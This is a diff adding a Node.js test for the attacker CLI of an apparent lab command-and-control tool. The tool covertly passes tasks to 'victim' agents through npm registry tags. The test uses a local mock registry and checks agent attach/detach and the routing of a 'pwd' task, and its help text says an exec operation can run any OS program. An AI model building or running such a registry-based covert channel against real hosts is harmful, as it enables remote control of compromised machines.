@@ -354,3 +354,73 @@ test('CLI splits long commands into chunk tags the victim can reassemble', async
     assert.equal(part.total, writtenTags.length);
   }
 });
+
+test('CLI attached-agent mode routes bare task ops and preserves local commands', async (t) => {
+  const agentId = 'agent1';
+  const announce = encodeAnnounceTag(agentId, {
+    ts: 9_999_999_999_999,
+    host: 'h',
+    cwd: '/lab',
+    lease: 'legacy-lease',
+  });
+  const tags = { latest: '1.0.0', [announce]: '1.0.0' };
+  const commandWrites = [];
+
+  const server = http.createServer((req, res) => {
+    res.setHeader('content-type', 'application/json');
+    if (req.method === 'GET') {
+      res.end(JSON.stringify(tags));
+      return;
+    }
+    if (req.method === 'PUT') {
+      const tag = decodeURIComponent(req.url.split('/').at(-1));
+      commandWrites.push(decodeCommandTag(tag));
+      tags[tag] = '1.0.0';
+      res.end('{}');
+      return;
+    }
+    res.statusCode = 405;
+    res.end('{}');
+  });
+  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+  t.after(() => server.close());
+
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-cli-'));
+  const stateFile = path.join(tmp, 'attacker-state.json');
+  const registryUrl = `http://127.0.0.1:${server.address().port}`;
+  const configFile = path.join(tmp, 'config.json');
+  fs.writeFileSync(configFile, JSON.stringify({
+    registryUrl,
+    packageName: 'lab-package',
+    pollIntervalSec: 10,
+    stateFile,
+  }));
+  const env = {
+    ...process.env,
+    NPM_C2_ENV_FILE: path.join(tmp, 'missing-env.sh'),
+    NPM_C2_REGISTRY_URL: registryUrl,
+    NPM_C2_PACKAGE_NAME: 'lab-package',
+    NPM_C2_POLL_INTERVAL: '10',
+    NPM_C2_STATE_FILE: stateFile,
+    NPM_C2_TOKEN: 'test-token',
+  };
+
+  const result = await runCli(
+    ['src/attacker/cli.js', '--config', configFile],
+    'help\nattach agent1\npwd\nhistory 1\nbogus\ndetach\npwd\nattach missing\nattach all\nexit\n',
+    env,
+  );
+
+  assert.equal(result.code, 0, result.stderr || result.stdout);
+  assert.match(result.stdout, /attach <agentId>/);
+  assert.match(result.stdout, /detach/);
+  assert.match(result.stdout, /exec can invoke any OS program with arguments when enableExec=true \(no shell parsing\)/);
+  assert.match(result.stdout, /attached to agent1; bare KC2 task operations now target it; results remain asynchronous/);
+  assert.match(result.stdout, /detached; restored kc2> prompt/);
+  assert.match(result.stdout, /unknown command "bogus" — type a KC2 task operation or "detach"/);
+  assert.match(result.stdout, /unknown command "pwd" — type "help"/);
+  assert.match(result.stdout, /agent "missing" is not known; task not sent/);
+  assert.match(result.stdout, /attach requires one known agent ID; "all" is not allowed/);
+  assert.doesNotMatch(result.stdout, /\x1B\[/);
+  assert.deepEqual(commandWrites.map(({ agentId: target, payload }) => [target, payload.op]), [[agentId, 'pwd']]);
+});
